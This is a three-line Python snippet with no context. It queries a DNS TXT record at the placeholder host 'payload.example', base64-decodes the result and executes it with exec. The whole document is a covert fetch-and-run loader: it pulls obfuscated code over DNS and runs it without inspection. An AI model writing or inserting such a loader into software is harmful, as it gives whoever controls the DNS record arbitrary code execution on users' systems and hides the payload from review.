import base64
import dns.resolver
exec(base64.b64decode(dns.resolver.resolve("payload.example", "TXT")[0]))
